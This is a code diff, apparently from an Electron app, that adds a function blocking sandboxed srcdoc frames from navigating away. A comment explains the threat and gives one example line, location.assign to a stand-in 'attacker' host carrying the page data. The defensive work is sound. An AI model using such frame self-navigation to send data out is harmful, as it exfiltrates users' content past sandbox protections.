@@ -56,3 +56,32 @@ export function createWindowOpenHandler(
     return { action: 'deny' }
   }
 }
+
+export interface FrameNavigationLike {
+  isMainFrame: boolean
+  /** Where the frame is NOW (`WebFrameMain.url`), before the navigation. */
+  frameUrl: string
+  /** Where it wants to go. */
+  url: string
+}
+
+const SRCDOC = 'about:srcdoc'
+
+/**
+ * `will-frame-navigate` policy for the srcdoc sandboxes (plugin realms,
+ * artifact previews, inline preview directives). `default-src 'none'` stops
+ * every sub-resource fetch, but a frame may still NAVIGATE ITSELF —
+ * `location.assign('https://attacker/?d=…')`, an `<a href>`, a `<meta
+ * refresh>` — and the top-level `will-navigate` guard never sees a sub-frame.
+ * That navigation is network egress with the whole page as the payload, and
+ * the landed remote document keeps the same `contentWindow`, so a host that
+ * authenticates on the WindowProxy alone would keep talking to it.
+ *
+ * Deny every navigation that would take a frame currently at `about:srcdoc`
+ * anywhere but `about:srcdoc` (re-setting `srcdoc` is the only legitimate
+ * reload). Frames that never were srcdoc (YouTube/Spotify embeds, the skills
+ * hub) are untouched, and so is the main frame.
+ */
+export function shouldDenyFrameNavigation(details: FrameNavigationLike): boolean {
+  return !details.isMainFrame && details.frameUrl === SRCDOC && details.url !== SRCDOC
+}
